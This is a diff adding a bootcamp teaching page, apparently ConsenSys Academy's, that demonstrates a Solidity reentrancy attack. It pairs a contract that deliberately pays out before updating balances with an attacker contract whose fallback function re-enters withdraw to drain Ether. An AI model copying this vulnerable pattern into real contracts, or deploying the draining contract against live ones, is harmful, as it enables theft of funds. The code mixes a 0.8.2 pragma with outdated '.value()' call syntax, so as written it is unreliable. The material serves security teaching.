@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Index - ConsenSys Academy Developer Bootcamp</title>
+    <link href="../../../style.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
+    <script src="../../../text-bounce.js" async></script>
+  </head>
+  <body>
+    <h1 id="reentrancy-example">Reentrancy Example</h1>
+<p>This set of contracts shows what a reentrancy attack (<a href="https://swcregistry.io/docs/SWC-107" target="_blank">SWC-107</a>) looks like.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">pragma</span><span class="w"> </span><span class="nv">solidity</span><span class="w"> </span><span class="mi">0</span>.<span class="mi">8</span>.<span class="mi">2</span><span class="c1">;</span><span class="w"></span>
+
+<span class="o">//</span><span class="w"> </span><span class="nv">Example</span><span class="w"> </span><span class="nv">Reentrancy</span><span class="w"> </span><span class="nv">Attack</span><span class="w">  </span>
+<span class="nv">contract</span><span class="w"> </span><span class="nv">VulnerableContract</span><span class="w"> </span>{<span class="w">    </span>
+<span class="w">  </span><span class="nv">mapping</span><span class="ss">(</span><span class="nv">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nv">uint</span><span class="ss">)</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">balances</span><span class="c1">;          </span><span class="w"></span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">deposit</span><span class="ss">()</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="nv">require</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">value</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="ss">)</span><span class="c1">;        </span><span class="w"></span>
+<span class="w">    </span><span class="nv">balances</span>[<span class="nv">msg</span>.<span class="nv">sender</span>]<span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">msg</span>.<span class="nv">value</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="ss">(</span><span class="nv">uint</span><span class="w"> </span><span class="nv">_amount</span><span class="ss">)</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="nv">require</span><span class="ss">(</span><span class="nv">balances</span>[<span class="nv">msg</span>.<span class="nv">sender</span>]<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nv">_amount</span>,<span class="w"> </span><span class="s2">&quot;Not enough balance!&quot;</span><span class="ss">)</span><span class="c1">;        </span><span class="w"></span>
+<span class="w">    </span><span class="nv">msg</span>.<span class="nv">sender</span>.<span class="nv">call</span>.<span class="nv">value</span><span class="ss">(</span><span class="nv">_amount</span><span class="ss">)(</span><span class="s2">&quot;&quot;</span><span class="ss">)</span><span class="c1">;        </span><span class="w"></span>
+<span class="w">    </span><span class="nv">balances</span>[<span class="nv">msg</span>.<span class="nv">sender</span>]<span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nv">_amount</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">getBalance</span><span class="ss">()</span><span class="w"> </span><span class="nv">view</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">returns</span><span class="ss">(</span><span class="nv">uint</span><span class="ss">)</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nv">address</span><span class="ss">(</span><span class="nv">this</span><span class="ss">)</span>.<span class="nv">balance</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">fallback</span><span class="ss">()</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="nv">external</span><span class="w"> </span>{}<span class="w"></span>
+}<span class="w">  </span>
+
+<span class="nv">contract</span><span class="w"> </span><span class="nv">MaliciousContract</span><span class="w"> </span>{<span class="w">    </span>
+<span class="w">  </span><span class="nv">VulnerableContract</span><span class="w"> </span><span class="nv">vulnerableContract</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">VulnerableContract</span><span class="ss">(</span><span class="mi">0</span><span class="nv">x08970FEd061E7747CD9a38d680A601510CB659FB</span><span class="ss">)</span><span class="c1">;          </span><span class="w"></span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">deposit</span><span class="ss">()</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="nv">vulnerableContract</span>.<span class="nv">deposit</span>.<span class="nv">value</span><span class="ss">(</span><span class="nv">msg</span>.<span class="nv">value</span><span class="ss">)()</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="ss">()</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="nv">vulnerableContract</span>.<span class="nv">withdraw</span><span class="ss">(</span><span class="mi">1</span><span class="w"> </span><span class="nv">ether</span><span class="ss">)</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">function</span><span class="w"> </span><span class="nv">getBalance</span><span class="ss">()</span><span class="w"> </span><span class="nv">view</span><span class="w"> </span><span class="nv">public</span><span class="w"> </span><span class="nv">returns</span><span class="ss">(</span><span class="nv">uint</span><span class="ss">)</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nv">address</span><span class="ss">(</span><span class="nv">this</span><span class="ss">)</span>.<span class="nv">balance</span><span class="c1">;    </span><span class="w"></span>
+<span class="w">  </span>}<span class="w">          </span>
+
+<span class="w">  </span><span class="nv">fallback</span><span class="ss">()</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="nv">external</span><span class="w"> </span>{<span class="w">        </span>
+<span class="w">    </span><span class="k">if</span><span class="ss">(</span><span class="nv">address</span><span class="ss">(</span><span class="nv">vulnerableContract</span><span class="ss">)</span>.<span class="nv">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">ether</span><span class="ss">)</span><span class="w"> </span>{<span class="w">            </span>
+<span class="w">      </span><span class="nv">vulnerableContract</span>.<span class="nv">withdraw</span><span class="ss">(</span><span class="mi">1</span><span class="w"> </span><span class="nv">ether</span><span class="ss">)</span><span class="c1">;        </span><span class="w"></span>
+<span class="w">    </span>}<span class="w">    </span>
+<span class="w">  </span>}<span class="w"></span>
+}<span class="w"></span>
+</code></pre></div>
+    <br /><div class="footer">
+    <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/staging/docs/S03-smart-contracts/M6-security/L2d-reentrancy-attack/index.md" target="_blank">Edit this page on GitHub</a>
+    
+    <div class="discord">
+        <img class="discord-logo" src="../../../discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
+    </div> 
+</div>
+  </body>
+</html>
